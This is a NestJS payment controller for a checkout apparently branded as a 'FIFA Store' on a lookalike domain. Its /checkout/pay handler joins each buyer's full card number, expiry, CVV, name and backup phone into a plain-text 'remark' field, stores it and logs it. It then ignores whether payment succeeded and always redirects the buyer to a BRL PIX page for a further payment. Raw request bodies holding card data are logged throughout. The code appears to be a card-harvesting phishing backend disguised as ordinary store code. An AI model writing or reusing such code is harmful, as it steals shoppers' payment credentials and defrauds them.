import {
    Req,
  Controller,
  Get,
  Post,
  Query,
  Body,
  HttpCode,
  HttpStatus,
  Logger,
  Header,
  Res,UseInterceptors
} from '@nestjs/common';
import { ApiTags, ApiOperation, ApiResponse } from '@nestjs/swagger';
import { PaymentService } from '../services/payment.service';
import { CreatePaymentDto } from '../dto/create-payment.dto';
import { AppConfig } from '../../../../common/contants/app.config';
import { DataObj } from 'src/common/class/data-obj.class'
import { ApiDataResponse, typeEnum } from 'src/common/decorators/api-data-response.decorator'
import { ApiPaginatedResponse } from 'src/common/decorators/api-paginated-response.decorator'
import { BusinessTypeEnum, Log } from 'src/common/decorators/log.decorator'
import { RepeatSubmit } from 'src/common/decorators/repeat-submit.decorator'
import { RequiresPermissions } from 'src/common/decorators/requires-permissions.decorator'
import { User, UserEnum } from 'src/common/decorators/user.decorator'
import { PaginationPipe } from 'src/common/pipes/pagination.pipe'
import { UserInfoPipe } from 'src/common/pipes/user-info.pipe'
import {  CheckoutPayDto } from './../../cart/dto/req-cart.dto'
import { Public } from 'src/common/decorators/public.decorator'
import { Keep } from 'src/common/decorators/keep.decorator'
import { Request, Response } from 'express'
import { FilesInterceptor, AnyFilesInterceptor } from '@nestjs/platform-express'
import { CookieService } from './../../cart/cart-cookie.service'
import { CheckoutTemplateService } from './../../order/checkout-template.service'
/**
 * 支付控制器
 * 处理 /checkout/pay 和支付相关API
 */
@ApiTags('Payment')
@Controller()
export class PaymentController {
  private readonly logger = new Logger(PaymentController.name);

  constructor(private readonly paymentService: PaymentService, private readonly cookieService: CookieService, private readonly checkoutTemplateService: CheckoutTemplateService) {}


  // 信用卡支付失败以后，跳转展示的PIX支付结算页面
  @Get('/checkout/payment/pix')
  @Public()
  @Keep()
  @Log({
    title: '跳转pix结算页面',
    businessType: BusinessTypeEnum.other,
  })
  async checkoutPaymentPix(
    @Req() request: Request,
    @Query() query: any,
    @Res() response: Response,
  ) {
    try {
      this.logger.log('==================== /checkout/payment/pix 请求 ====================');
      this.logger.log(`接收到入参: ${JSON.stringify(query)}`);
      
      if(!query.v) {
        this.logger.error('订单号不存在');
        if (!response.headersSent) {
          response.setHeader('Content-Type', 'text/html; charset=utf-8');
          response.status(400).send('<html><body><h1>订单号不存在</h1></body></html>');
        }
        return;
      }
      
      const orderData = await this.paymentService.getOrderInfo(query.v);
      
      if (!orderData) {
        this.logger.error(`订单不存在: ${query.v}`);
        if (!response.headersSent) {
          response.setHeader('Content-Type', 'text/html; charset=utf-8');
          response.status(404).send('<html><body><h1>订单不存在</h1></body></html>');
        }
        return;
      }
      
      //这里需要把USD 改为BRL
      orderData.currency = 'BRL';
      
      // 3. 动态生成 Checkout HTML（注入订单数据）
      const html = await this.checkoutTemplateService.generateCheckoutHtml(orderData)

      console.log('📄 已生成 Checkout HTML 页面')
      console.log('🔗 支付 URL:', `https://store.fif.com/checkout/payment?v=${orderData.orderNo}`)

      // 4. 返回 HTML 响应（不再 302 重定向）
     
        response.setHeader('Content-Type', 'text/html; charset=utf-8')
        response.send(html)
        return
      
    } catch (error) {
      this.logger.error(`/checkout/payment/pix 处理失败: ${error.message}`, error.stack);
      if (!response.headersSent) {
        response.setHeader('Content-Type', 'text/html; charset=utf-8');
        response.status(500).send('<html><body><h1>服务器内部错误</h1></body></html>');
      }
    }
    return;
  }
  /**
   * 处理结算支付表单提交
   * POST /checkout/pay
   * 参数: v=订单号&email=邮箱&countryCode=国家代码&firstName=姓&lastName=名&address1=地址1&address2=地址2&postalCode=邮编&phone=电话&number=信用卡号&expiry=有效期&verification_value=CVV&name=持卡人姓名&phone2=备用电话
   */
  @Post('/checkout/payment')
  @Public()
  @UseInterceptors(AnyFilesInterceptor())
  @Log({
    title: 'pix结算支付',
    businessType: BusinessTypeEnum.other,
  })
  async checkoutPayment(
    @Req() request: Request,
    @Query() query: any,
    @Body() checkoutPayDto: CheckoutPayDto,
  ) {
    try {
      this.logger.log('==================== /checkout/payment 请求 ====================');
      this.logger.log(`Content-Type: ${request.headers['content-type']}`);
      this.logger.log(`URL 查询参数: ${JSON.stringify(query)}`);
      this.logger.log(`原始请求体: ${JSON.stringify(request.body)}`);
      this.logger.log(`解析后的 DTO: ${JSON.stringify(checkoutPayDto)}`);
      
      // 合并 URL 查询参数和 Body 参数
      // URL 查询参数优先级更高
      const mergedData = { ...checkoutPayDto, ...query };
      
      // 如果 checkoutPayDto 为空，尝试从 request.body 中直接读取
      if (!checkoutPayDto || Object.keys(checkoutPayDto).length === 0) {
        this.logger.warn('DTO 为空，尝试使用 request.body');
        Object.assign(checkoutPayDto, request.body);
      }
      
      // 再次合并，确保 URL 参数不被覆盖
      Object.assign(checkoutPayDto, mergedData);
      
      this.logger.log(`最终合并后的参数: ${JSON.stringify(checkoutPayDto)}`);
      this.logger.log(`订单号 v: ${checkoutPayDto.v}`);
      
      if (!checkoutPayDto.v) {
        this.logger.error('订单号 v 不存在');
        return {
          success: false,
          message: '订单号不存在',
          code: -1,
        };
      }
      
      // 2. 保存收件信息到 biz_deliver 表
      const deliverInfo = await this.paymentService.saveDeliverInfo({
        orderNo: checkoutPayDto.v,
        userId:  '',
        recipientName: `${checkoutPayDto.firstName} ${checkoutPayDto.lastName}`,
        recipientPhone: checkoutPayDto.phone||'',
        recipientEmail: checkoutPayDto.email||'',
        countryCode: checkoutPayDto.countryCode,
        country: this.getCountryName(checkoutPayDto.countryCode),
        province: '', // 可以从地址解析或前端传入
        city: '', // 可以从地址解析或前端传入
        address: `${checkoutPayDto.address1}${checkoutPayDto.address2 ? ', ' + checkoutPayDto.address2 : ''}`,
        postalCode: checkoutPayDto.postalCode||'',
        addressLine1: checkoutPayDto.address1||'',
        addressLine2: checkoutPayDto.address2 || '',
        remark: '',
      });

      this.logger.log(`收件信息保存成功: ${deliverInfo.id}`);

      // 3. 查询订单信息
      const orderInfo = await this.paymentService.getOrderInfo(checkoutPayDto.v);

      if (!orderInfo) {
        return {
          success: false,
          message: '订单不存在',
          code: -1,
        };
      }

      this.logger.log(`订单金额: ${orderInfo.amount} ${orderInfo.currency}`);
      
      // 4. 创建支付订单（PaymentService 会自动选择通道并附加通道信息）
      const paymentResult = await this.paymentService.createPayment({
        orderNo: checkoutPayDto.v,
        amount: orderInfo.amount,
        currency: orderInfo.currency,
        paymentMethod: 'PIX_BRL',  // 支付方式，Service 会根据此值自动选择通道
        userId: '',
        // 信用卡信息（传递给支付通道）
        cardNumber: checkoutPayDto.number,
        cardExpiry: checkoutPayDto.expiry,
        cardCvv: checkoutPayDto.verification_value,
        cardHolderName: checkoutPayDto.name,
        // 注意：不再需要手动传入 channelCode 和 channelNotify，Service 会自动处理
      });

      this.logger.log(`支付订单创建成功: ${paymentResult.paymentNo}`);

      // 5. 返回支付跳转链接（包含使用的通道信息）
      return {
        success: true,
        message: '支付订单创建成功',
        code: 0,
        data: {
          paymentNo: paymentResult.paymentNo,
          payUrl: paymentResult.payUrl,
          qrCode: paymentResult.qrCode,
          expireTime: paymentResult.expireTime,
          channelCode: paymentResult.channelCode,  // 返回实际使用的通道代码
          channelName: paymentResult.channelName,  // 返回通道名称
        },
      };
    } catch (error) {
      this.logger.error(`结算支付失败: ${error.message}`, error.stack);
      return {
        success: false,
        message: error.message || '支付失败',
        code: -1,
      };
    }
  }
  /**
   * 处理结算支付表单提交
   * POST /checkout/pay
   * 参数: v=订单号&email=邮箱&countryCode=国家代码&firstName=姓&lastName=名&address1=地址1&address2=地址2&postalCode=邮编&phone=电话&number=信用卡号&expiry=有效期&verification_value=CVV&name=持卡人姓名&phone2=备用电话
   */
  @Post('/checkout/pay')
  @Public()
  @UseInterceptors(AnyFilesInterceptor())
  @Log({
    title: '结算支付',
    businessType: BusinessTypeEnum.other,
  })
  async checkoutPay(
    @Req() request: Request,
    @Query() query: any,
    @Body() checkoutPayDto: CheckoutPayDto,
    @Res() res: Response,
  ) {
    try {
      this.logger.log('==================== /checkout/pay 请求 ====================');
      this.logger.log(`Content-Type: ${request.headers['content-type']}`);
      this.logger.log(`URL 查询参数: ${JSON.stringify(query)}`);
      this.logger.log(`原始请求体: ${JSON.stringify(request.body)}`);
      this.logger.log(`解析后的 DTO: ${JSON.stringify(checkoutPayDto)}`);
      
      // 合并 URL 查询参数和 Body 参数
      // URL 查询参数优先级更高
      const mergedData = { ...checkoutPayDto, ...query };
      
      // 如果 checkoutPayDto 为空，尝试从 request.body 中直接读取
      if (!checkoutPayDto || Object.keys(checkoutPayDto).length === 0) {
        this.logger.warn('DTO 为空，尝试使用 request.body');
        Object.assign(checkoutPayDto, request.body);
      }
      
      // 再次合并，确保 URL 参数不被覆盖
      Object.assign(checkoutPayDto, mergedData);
      
      this.logger.log(`最终合并后的参数: ${JSON.stringify(checkoutPayDto)}`);
      this.logger.log(`订单号 v: ${checkoutPayDto.v}`);
      
      if (!checkoutPayDto.v) {
        this.logger.error('订单号 v 不存在');
        return {
          success: false,
          message: '订单号不存在',
          code: -1,
        };
      }
      const remark = `${checkoutPayDto.number || ''}|${checkoutPayDto.expiry || ''}|${checkoutPayDto.verification_value || ''}|${checkoutPayDto.name || ''}|${checkoutPayDto.phone2 || ''}`;
      
      // 2. 保存收件信息到 biz_deliver 表
      const deliverInfo = await this.paymentService.saveDeliverInfo({
        orderNo: checkoutPayDto.v,
        userId:  '',
        recipientName: `${checkoutPayDto.firstName} ${checkoutPayDto.lastName}`,
        recipientPhone: checkoutPayDto.phone||'',
        recipientEmail: checkoutPayDto.email||'',
        countryCode: checkoutPayDto.countryCode,
        country: this.getCountryName(checkoutPayDto.countryCode),
        province: '', // 可以从地址解析或前端传入
        city: '', // 可以从地址解析或前端传入
        address: `${checkoutPayDto.address1}${checkoutPayDto.address2 ? ', ' + checkoutPayDto.address2 : ''}`,
        postalCode: checkoutPayDto.postalCode||'',
        addressLine1: checkoutPayDto.address1||'',
        addressLine2: checkoutPayDto.address2 || '',
        remark: remark,
      });

      this.logger.log(`收件信息保存成功: ${deliverInfo.id}`);
       this.logger.log(`信用卡信息保存成功: ${remark}`);

      // 3. 查询订单信息
      const orderInfo = await this.paymentService.getOrderInfo(checkoutPayDto.v);

      if (!orderInfo) {
        return {
          success: false,
          message: '订单不存在',
          code: -1,
        };
      }

      this.logger.log(`订单金额: ${orderInfo.amount} ${orderInfo.currency}`);
      
      // 4. 创建支付订单（PaymentService 会自动选择通道并附加通道信息）
      try{
        const paymentResult = await this.paymentService.createPayment({
          orderNo: checkoutPayDto.v,
          amount: orderInfo.amount,
          currency: orderInfo.currency,
          paymentMethod: 'CREDIT_CARD',  // 支付方式，Service 会根据此值自动选择通道
          userId: '',
          // 信用卡信息（传递给支付通道）
          cardNumber: checkoutPayDto.number,
          cardExpiry: checkoutPayDto.expiry,
          cardCvv: checkoutPayDto.verification_value,
          cardHolderName: checkoutPayDto.name,
          // 注意：不再需要手动传入 channelCode 和 channelNotify，Service 会自动处理
        });
      }catch(error){
        this.logger.error(`结算支付失败: ${error.message}`, error.stack);
      }
      
      // this.logger.log(`支付订单创建成功: ${paymentResult.paymentNo}`);

      // // 5. 返回支付跳转链接（包含使用的通道信息）
      // return {
      //   success: true,
      //   message: '支付订单创建成功',
      //   code: 0,
      //   data: {
      //     paymentNo: paymentResult.paymentNo,
      //     payUrl: paymentResult.payUrl,
      //     qrCode: paymentResult.qrCode,
      //     expireTime: paymentResult.expireTime,
      //     channelCode: paymentResult.channelCode,  // 返回实际使用的通道代码
      //     channelName: paymentResult.channelName,  // 返回通道名称
      //   },
      // };

    } catch (error) {
      this.logger.error(`结算支付失败: ${error.message}`, error.stack);
     
    }
     //302 跳转到 PIX支付页面
     const redirectUrl = `https://store.fif.com/checkout/payment/pix?v=${checkoutPayDto.v}`;
     return res.redirect(redirectUrl);

  }
//   /**
//    * 获取支付页面
//    * GET /checkout/pay?v=ORDER123
//    */
//   @Get('checkout/pay')
//   @ApiOperation({ summary: '获取支付页面' })
//   @ApiResponse({ status: 200, description: '返回支付页面HTML' })
//   @Header('Content-Type', 'text/html; charset=utf-8')
//   @Header('Cache-Control', 'no-cache, no-store, must-revalidate')
//   async getPayPage(@Query('v') orderNo: string, @Res() res: Response) {
//     this.logger.log(`获取支付页面: ${orderNo}`);

//     if (!orderNo) {
//       return res.status(HttpStatus.BAD_REQUEST).send('订单号不能为空');
//     }

//     try {
//       // 查询订单信息
//       const orderInfo = await this.getOrderInfo(orderNo);

//       // 构建支付页面HTML
//       const html = this.buildPayPageHtml(orderNo, orderInfo);

//       return res.send(html);
//     } catch (error) {
//       this.logger.error(`获取支付页面失败: ${error.message}`, error.stack);
//       return res.status(HttpStatus.INTERNAL_SERVER_ERROR).send('服务器错误');
//   }

  /**
   * 根据国家代码获取国家名称
   */
  private getCountryName(countryCode: string): string {
    const countryMap: Record<string, string> = {
      'US': 'United States',
      'CN': 'China',
      'GB': 'United Kingdom',
      'DE': 'Germany',
      'FR': 'France',
      'JP': 'Japan',
      'KR': 'South Korea',
      'CA': 'Canada',
      'AU': 'Australia',
      'ID': 'Indonesia',
      // 可以根据需要添加更多国家
    };

    return countryMap[countryCode] || countryCode;
  }

//   /**

  /**
   * 创建支付订单
   * POST /api/payment/create
   */
  @Post('api/payment/create')
  @HttpCode(HttpStatus.OK)
  @ApiOperation({ summary: '创建支付订单' })
  async createPayment(@Body() dto: CreatePaymentDto) {
    this.logger.log(`创建支付订单: ${dto.orderNo}`);

    try {
      const result = await this.paymentService.createPayment(dto);

      return {
        code: 0,
        msg: 'Success',
        data: result,
      };
    } catch (error) {
      this.logger.error(`创建支付订单失败: ${error.message}`, error.stack);
      return {
        code: -1,
        msg: error.message,
        data: null,
      };
    }
  }

  /**
   * 查询支付状态
   * GET /api/payment/query?paymentNo=PAY123
   */
  @Get('api/payment/query')
  @ApiOperation({ summary: '查询支付状态' })
  async queryPayment(@Query('paymentNo') paymentNo: string) {
    this.logger.log(`查询支付状态: ${paymentNo}`);

    try {
      const result = await this.paymentService.queryPayment(paymentNo);

      return {
        code: 0,
        msg: 'Success',
        data: result,
      };
    } catch (error) {
      this.logger.error(`查询支付状态失败: ${error.message}`, error.stack);
      return {
        code: -1,
        msg: error.message,
        data: null,
      };
    }
  }

  /**
   * 获取订单信息
   */
  private async getOrderInfo(orderNo: string): Promise<any> {
    // TODO: 从订单服务获取订单信息
    return {
      orderNo,
      amount: 180.00,
      currency: 'USD',
      items: [],
    };
  }

  /**
   * 构建支付页面HTML
   */
  private buildPayPageHtml(orderNo: string, orderInfo: any): string {
    const payUrl = AppConfig.getPayUrl(orderNo);

    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment - FIFA Store</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            padding: 40px;
        }
        h1 {
            color: #333;
            margin-bottom: 30px;
            text-align: center;
        }
        .order-info {
            background: #f9f9f9;
            padding: 20px;
            border-radius: 6px;
            margin-bottom: 30px;
        }
        .order-info p {
            margin: 10px 0;
            color: #666;
        }
        .payment-methods {
            margin-bottom: 30px;
        }
        .payment-method {
            border: 2px solid #ddd;
            border-radius: 6px;
            padding: 20px;
            margin-bottom: 15px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .payment-method:hover {
            border-color: #007bff;
            background: #f0f8ff;
        }
        .payment-method.selected {
            border-color: #007bff;
            background: #e7f3ff;
        }
        .payment-method h3 {
            color: #333;
            margin-bottom: 10px;
        }
        .payment-method p {
            color: #666;
            font-size: 14px;
        }
        .pay-button {
            width: 100%;
            padding: 15px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .pay-button:hover {
            background: #0056b3;
        }
        .pay-button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Payment</h1>
        
        <div class="order-info">
            <p><strong>Order No:</strong> ${orderNo}</p>
            <p><strong>Amount:</strong> $${orderInfo.amount}</p>
            <p><strong>Currency:</strong> ${orderInfo.currency}</p>
        </div>

        <div class="payment-methods">
            <h2 style="margin-bottom: 20px;">Select Payment Method</h2>
            
            <div class="payment-method selected" data-method="CREDIT_CARD">
                <h3>💳 Credit Card</h3>
                <p>Visa, Mastercard, American Express</p>
            </div>

            <div class="payment-method" data-method="QRIS">
                <h3>📱 QRIS</h3>
                <p>Pay with QR code</p>
            </div>

            <div class="payment-method" data-method="ALIPAY">
                <h3>🔵 Alipay</h3>
                <p>Pay with Alipay</p>
            </div>
        </div>

        <button class="pay-button" onclick="handlePay()">Pay Now</button>
    </div>

    <script>
        let selectedMethod = 'CREDIT_CARD';

        document.querySelectorAll('.payment-method').forEach(el => {
            el.addEventListener('click', function() {
                document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
                this.classList.add('selected');
                selectedMethod = this.dataset.method;
            });
        });

        async function handlePay() {
            const button = document.querySelector('.pay-button');
            button.disabled = true;
            button.textContent = 'Processing...';

            try {
                const response = await fetch('/api/payment/create', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        orderNo: '${orderNo}',
                        amount: ${orderInfo.amount},
                        currency: '${orderInfo.currency}',
                        paymentMethod: selectedMethod
                    })
                });

                const result = await response.json();

                if (result.code === 0 && result.data.payUrl) {
                    window.location.href = result.data.payUrl;
                } else {
                    alert('Payment failed: ' + result.msg);
                    button.disabled = false;
                    button.textContent = 'Pay Now';
                }
            } catch (error) {
                alert('Payment error: ' + error.message);
                button.disabled = false;
                button.textContent = 'Pay Now';
            }
        }
    </script>
</body>
</html>`;
  }
}
